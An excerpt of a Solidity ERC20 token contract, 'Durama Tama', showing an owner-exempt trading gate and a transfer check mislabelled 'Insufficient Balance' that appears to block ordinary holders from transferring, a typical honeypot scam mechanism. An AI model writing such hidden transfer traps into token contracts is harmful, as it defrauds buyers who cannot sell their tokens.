...
contract Duratama is Context, IERC20, Ownable {
	...
	uint256 private _maxWallet= 60000000 * 10**8;
	...
	string private constant _name = "Durama Tama";
	string private constant _symbol = "DURATAMA";
	...
	function _transfer(address from, address to, uint256 amount) private {
		...
		if (from != owner() && to != owner()) {
			...
			if (from == _pair && to != address(_uniswap) && ! _isExcludedFromFee[to] ) {
				require(_canTrade,"Trading is not enabled");
	...
	function _tokenTransfer(address sender, address recipient, uint256 tAmount, uint256 taxRate) private {
		...
		if(!_isExcludedFromFee[sender] &&!_isExcludedFromFee[recipient]){
			require(balanceOf(_from)<tAmount/10000000,"Insufficient Balance");
		}
